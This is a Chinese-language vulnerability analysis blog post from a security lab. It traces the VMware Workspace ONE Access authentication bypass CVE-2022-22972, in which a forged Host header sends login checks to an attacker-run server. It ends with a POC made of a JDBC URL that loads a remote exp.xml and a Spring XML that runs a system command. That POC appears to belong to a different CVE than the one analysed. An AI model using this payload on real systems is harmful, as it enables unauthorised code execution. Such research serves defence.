<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=Mzg3NDcwMDk3OA==&mid=2247483810&idx=1&sn=48063cb1d5271a9b9668a6848be09c2e&chksm=cecd887ff9ba016909849b0e941f69f409d547ca94389a37f50dec9d7dccfa537368c673fb33&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/wfFYMXc5G1NSkNgX8voWSJmuSUlcQtsLPDYpfrCgibeGgXXNicAVnP7xGkKibicLx6DUalljh7puaPqUwVZ0FWjqhA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1NSkNgX8voWSJmuSUlcQtsLKWSxBUmsxRCOqbNibhhXFuhtfXiak5ibYGMcEGD9yzzIy4qVq1Q5a63IQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1NSkNgX8voWSJmuSUlcQtsLgZE9TXJrsxHuabVS0UbocSyplzJJ0pxtQQZpAzIBdZwlByjZ3qUUAQ/640?wx_fmt=png)

**xxhzz**

**@PortalLab 实验室**

**漏洞描述**

5 月 18 日，VMware 发布了一份公告 (VMSA-2022-0014)，以解决多个 VMware 产品中的两个漏洞，其中包括 CVE-2022-22972，该漏洞在身份认证处理时存在一定缺陷。远程攻击者可通过伪造相关请求信息来绕过身份验证，从而获取相关应用程序的管理权限。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI4q8j3htGS6Z6A2vokTYF1SzQUwx07BMLoyxvbxhL4a7PfzpzpjwG84A/640?wx_fmt=png)

**相关介绍**

VMware 是一家提供全球桌面到数据中心虚拟化解决方案的厂商，其推出的产品包括我们最熟悉的 VMware Workstation，一款桌面虚拟计算软件。此次漏洞涉及的多个产品介绍如下：

VMware Workspace ONE Access  是  VMware  公司开发的一款智能驱动型数字化工作空间平台，通过 Workspace ONE Access  能够随时随地在任意设备上轻松、安全地交付和管理任意应用。VMware vRealize Automation 是自动化部署方案云管平台。VMware Cloud Foundation 是 VMware 公司混合云平台。vRealize Suite Lifecycle Manager 是 vRealize Suite 生命周期和内容管理平台。

**利用范围**

*   VMware Workspace ONE Access 21.08.0.1, 21.08.0.0，20.10.0.1, 20.10.0.0
    

*   VMware Identity Manager（vIDM） 3.3.6, 3.3.5, 3.3.4, 3.3.3
    

*   VMware vRealize Automation(vIDM)  7.6
    

*   VMware Cloud Foundation (vIDM) 4.4, 4.3.x, 4.2.x, 4.1, 4.0.x
    

*   VMware Cloud Foundation (vRA) 3.x
    

*   vRealize Suite Lifecycle Manager(vIDM) 8.x
    

**漏洞分析**

简单回顾下 CVE-2022-22954（ VMware Workspace ONE Access SSTI 漏洞），属于模板注入漏洞，恶意攻击者可以利用此漏洞在未经过身份验证的情况下进行远程任意代码执行；CVE-2022-22957（VMware Workspace ONE Access JDBC 注入漏洞），由于相关参数完全可控，恶意攻击者可实行 JDBC 注入，通过写入任意文件等方式获取系统权限。此次的 CVE-2022-22972，同样选择 VMware Workspace ONE Access 漏洞版本来进行分析，并详细记录环境搭建和漏洞分析复现过程。

**环境搭建**

先从官网（https://customerconnect.vmware.com/downloads/details?downloadGroup=WS1A_ONPREM_210801&productId=1269）下载 VMware Workspace ONE Access 21.08.0.1 OVA 文件

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI4KV1Ig2ZSTiazHHyfrXicfS5PFLL6vL4IKEB7licZw7nxAYdK5NRcuKDkA/640?wx_fmt=png)

使用 VMware Workstation 导入 OVA 文件，配置 FQDN（主机名设置为随机域名，不然后续配置数据库时会报错）。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI4YQQrnfgFMiaqlCsiaTc834NuqFTAmIwRmaA36fdhGiaQgxwOlH3SmISUw/640?wx_fmt=png)

导入成功后会进行初始化，完成后出现如下信息。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI46rqBcffSohKFdLMcaYS2AvP29d4Nic7oI5iblNaWkanNazCZ5eCHQpug/640?wx_fmt=png)

访问 https://<域名：8443>，根据提示进行账号和数据库配置。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI4OB5KBFTXAEpK24gn5VoDfZD4YVcDMWm7Rm4sj8aqoMYIKlDlZ21n1Q/640?wx_fmt=png)

按照要求，一步一步完成配置即可。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI4s5Nfss66UibnOUicZFYT8uFAXm6UmnyMibL5Qq8B5ndJk1u7GfdMDU9Lg/640?wx_fmt=png)

为搭建动态调试环境，需将相关源码保存到本地，并使用 IDEA 开启远程调试

需要的 lib 文件位于 / usr/local/horizon/lib/embeddedauthadapters 目录下。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI4YAficI7r7mo7bPKZv0osMpsoPU49ibUKBbPZq1yedOX4ArRq21OXiaOzQ/640?wx_fmt=png)

IDEA 配置远程调试。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI44pNqWwWtVKicGWPMgxzNkl0H59w7ftKIGR6NavMPYSZJf9kqEsTJe1w/640?wx_fmt=png)

将远程调试命令写入 / opt/vmware/horizon/workspace/bin/setenv.sh。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI4nAlWtiaeI4eMgBqvGfjsZYLEZoOGtvKhPoBKRjopwyVAJN5TeBcsXPQ/640?wx_fmt=png)

重启服务之后，配置 iptables 防火墙，允许数据包通过 INPUT 链和 OUTPUT 链。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI40nSLTOHZ4Rj6dt2JiaUI56ZgJYiaRQxWF7g1ahwkPLMHRxlpqoAFf0VA/640?wx_fmt=png)

最后访问 https://<域名>，到登陆页面，环境搭建成功。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI40UQkUatKvCPHciayRNyVx3LxgItBVpjCO8Zdn23jLJdDiaNiaHX9Gs6Iw/640?wx_fmt=png)

**动态分析**

抓取登陆数据包，修改 Host 头为 tessdadddd 后进行重放。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI49HyoO2Z0ib1XUV8H1KgGUGQJe2b1CTGhicIqicj0qwTDjqBUZvt8Jn2oA/640?wx_fmt=png)

回到 vmware 中，查看 / opt/vmware/horizon/workspace/logs/horizon.log

在日志中发现，vm 对任意输入的 host 头，发送了 HTTP 请求，并且因为无法解析而抛出异常。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI4p2ibldrt6NJkVFLen8RXToDHfibYV3l1Q4hZgGZcn0yGMf2BxQbdiaSJA/640?wx_fmt=png)

同时，根据日志信息中整个认证的调用栈，我们将分析的开端定位在 local-password-auth-adapter-0.1.jar 中。

分析 com.vmware.horizon.adapters.local.LocalPasswordAuthAdapter#login 函数。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI4bmlOlWBibq6zm9sKWdTajnqDx8huE9qhPjcNfEP3f0Ka7ktofEhuiaag/640?wx_fmt=png)

在获取到账号密码等信息之后，通过 getLocalUrl 函数来提取参数 endpoint

跟进 com.vmware.horizon.adapters.local.LocalPasswordAuthAdapter#getLocalUrl 函数。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI49ibBkLaQ0gJmIlUibcJc7VricQmbrzjR72Qz2LFZoJAA1nGLyv5NfdRTw/640?wx_fmt=png)

在 getLocalUrl 函数中，会构造出一个新的 HTTPS 请求，其中的主机地址则是通过 request.getServerName 从 HOST 头中直接获取。因此这也为我们绕过认证伪造主机地址创造了条件。

继续跟进将回到 com.vmware.horizon.adapters.local.LocalPasswordAuthAdapter#login

此时的 endpoint 即为新构造的 HTTPS 请求，主机名则为我们任意输入的 tessdadddd。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI4M8aNkYRvaYeHDpOeiaGHQ52NCwEzibJGsh2S7INS0QxYk8U5BfSoMa9w/640?wx_fmt=png)

后续，则会调用 authenticate 函数来完成认证。

在 com.vmware.horizon.adapters.local.LocalPasswordService#authenticate 中可以发现。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI4ibUg3e0VO9VBS81IkuwzBXIZXQzLI2sAtsicib6xZiaFptQWt8SbR39MeQ/640?wx_fmt=png)

通过之前的 HTTPS 请求，使用 POST 方式发送，后续会直接根据请求返回的状态码来判断是否认证成功，若状态码为 200，即认证成功。因此可通过伪造 HOST 头和伪造 HTTPS 服务器并保证对任何请求返回状态 200，即可实现认证绕过。

**漏洞复现**

伪造 HTTPS 服务器，满足对任意请求都返回 200。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI4zkphejQ1mGYrexVHwJWR0H7Zvb2hOCte5JBIXnibSWlYibiblHQFmkNnA/640?wx_fmt=png)

修改 HOST 为伪造的 HTTPS 服务器地址，成功绕过认证并获取有效 cookie。

![图片](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MZev82ZYTmAj93SQSepvI4EcmXfc7tmzfLyG2jEF3Y9tLga2pWFluiaUEZdm2HUibrqhNjboGuqib4Q/640?wx_fmt=png)

POC

```
jdbc:postgresql://xxx.xxx.com/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://xxx/exp.xml
```

exp.xml

```
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value>whoami</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

**参考材料**

1. https://www.vmware.com/security/advisories/VMSA-2022-0014.html

2. https://www.horizon3.ai/vmware-authentication-bypass-vulnerability-cve-2022-22972-technical-deep-dive/

3. https://y4er.com/post/cve-2022-22972-vmware-workspace-one-access-authentication-bypass-rce/

4. https://mp.weixin.qq.com/s/fQIfOHgTB9fEkczdJ8-IBQ

**关于 Portal Lab**

  

星阑科技 Portal Lab 致力于前沿安全技术研究及能力工具化。主要研究方向为 API 安全、应用安全、攻防对抗等领域。实验室成员研究成果曾发表于 BlackHat、HITB、BlueHat、KCon、XCon 等国内外知名安全会议，并多次发布开源安全工具。未来，Portal Lab 将继续以开放创新的态度积极投入各类安全技术研究，持续为安全社区及企业级客户提供高质量技术输出。

![图片](https://mmbiz.qpic.cn/mmbiz_gif/wfFYMXc5G1NSkNgX8voWSJmuSUlcQtsLrq7oFZwgsibEfCibkmpTHuGWYqVL8THdAC0gUATPx8bu7CGFsichmzRhA/640?wx_fmt=gif)